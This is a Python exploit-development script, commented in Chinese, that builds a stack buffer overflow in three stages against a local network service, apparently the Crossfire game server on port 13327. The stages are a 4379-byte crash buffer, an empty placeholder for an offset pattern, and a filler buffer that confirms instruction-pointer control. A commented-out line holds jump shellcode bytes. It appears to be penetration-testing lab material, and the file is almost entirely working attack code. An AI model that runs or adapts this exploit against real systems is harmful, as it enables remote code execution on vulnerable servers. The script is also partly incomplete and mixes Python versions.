import socket
def first():
    host = "127.0.0.1"
    crash = "\x41" * 4379  # \x41是ASCII码代表"A" 4379是判断多少个字符能使程序发生缓冲区溢出
    buffer = "\x11(setup sound" + crash + "\x90\x00#"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[*]Sending evil buffer...")
    s.connect((host, 13327))  # host后面是连接的端口号
    data = s.recv(1024)
    print(data)
    s.send(buffer)
    s.close()
    print("[*]Payload sent")
def second():
    host = "127.0.0.1"
    crash = ""  # crash的值是大量的不重复的字母数字组合用于精确确定位置
    buffer = "\x11(setup sound" + crash + "\x90\x00#"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[*]Sending evil buffer...")
    s.connect((host, 13327))  # host后面是连接的端口号
    data = s.recv(1024)
    print(data)
    s.send(buffer)
    s.close()
    print("[*]Payload sent")
def third():
    host = "127.0.0.1"
    crash = 'A' * 4368 + 'B' * 4 + 'C' * 7  # 用于验证是否执行了该4个字符
    # crash = 'A'*4368 + 'B' * 4 + '\x83\xc0\x0c\xff\xe0\x90\x90'
    buffer = "\x11(setup sound" + crash + "\x90\x00#"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[*]Sending evil buffer...")
    s.connect((host, 13327))  # host后面是连接的端口号
    data = s.recv(1024)
    print(data)
    s.send(buffer)
    s.close()
    print("[*]Payload sent")
if __name__ == '__main__':
    choice = input("输入使用阶段1/2/3")
    if choice == "1":
        first()
    elif choice == "2":
        second()
    elif choice == "3":
        third()
    else:
        print("输入错误")